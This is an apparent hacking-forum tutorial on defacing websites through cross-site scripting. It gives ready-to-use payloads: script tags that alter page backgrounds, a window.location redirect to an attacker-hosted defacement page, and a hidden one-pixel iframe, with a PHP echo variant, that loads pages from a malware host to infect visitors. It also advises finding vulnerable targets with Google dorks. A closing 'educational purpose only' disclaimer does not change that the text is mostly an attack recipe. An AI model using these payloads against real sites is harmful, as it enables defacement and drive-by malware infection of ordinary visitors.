@@ -1,0 +1,99 @@
+🔰How to deface website with Cross Site Scripting.🔰
+
+Today i am gonna teach you how to deface the sites which has the XSS vulnerability .
+
+Defacing is one of the most common thing when the hacker found the vulnerability in website.
+
+Defacing is changing the content the website to Hacker content.
+
+Most of time, attacker use this technique to inform about the vulnerability to Admin.
+
+But it's bad idea..!
+
+i have some easiest methods to deface the Xss vuln sites .. i will be teaching u one by one .
+
+1 - Script for changing the background Color of a website:
+
+<script>document.body.bgColor="red";</script>
+
+use this in your target website as
+
+Code:
+
+http://www.targetwebsite.com/<script&...y.bgColor="red";</script>
+
+
+
+2 - Script for chaning the background image of a website:
+
+Code:
+
+<script>document.body.background="http://your_image.jpg/";</script>
+
+
+
+3 - Defacement Page with Pastehtml:
+
+First of all upload some defacement page(html) to pastehtml.com and get the link.
+
+When you find a XSS vulnerable site, then insert the script as :
+
+Code:
+
+<script>window.location="http://www.pastehtml.com/Your_Defacement_link";</script>
+
+
+
+This script will redirect the page to your pastehtml defacement page.
+
+Note: You can deface only persistent XSS vulnerable sites.
+
+4 - Defacing with iframe Injection
+
+What is an IFrame Injection?
+
+Using IFrame tag, The Attackers injects the malware contain website(links)
+
+using Cross site Scripting in popular websites.
+
+So if the usual visitors of that popular sites opens the website,
+
+it will redirect to malware contain website.
+
+Malware will be loaded to your computer, now you are infected .
+
+What an attacker can do with Iframe Injection?
+
+Using Iframe Injection, an attacker can inject advertisements inside any other websites,
+
+insert malware infected site links, redirect to malware infected sites and more.
+
+Iframe Injection Tutorial:
+
+1.First of all attacker will find the Vulnerable websites using google dorks.
+
+2. They test the vulnerability by inserting some iframe tag using the url.
+
+3. then insert the Malicious Iframe code inside the webpage.
+
+For Example:
+
+he can insert this code using the url:
+
+Code:
+
+<iframe src=”http://malwarewebpages/web.html” width=1 height=1 style=”visibility:hidden;position:absolute”></iframe>
+
+
+For php webpages:
+
+Code:
+
+echo “<iframe src=\”http://malwarewebpages/web.html\” width=1 height=1 style=\”visibility:hidden;position:absolute\”></iframe>”;
+
+
+I have just given some easy method only to deface the XSS affected page ..
+
+It wil be beginner friendly .. Still there are more methods to deface it.. 
+
+IMP NOTE : : Never implement this technique. I am just explaining it for educational purpose only.WE ARE Not RESPONSIBLE FOR ANY MISUSE.
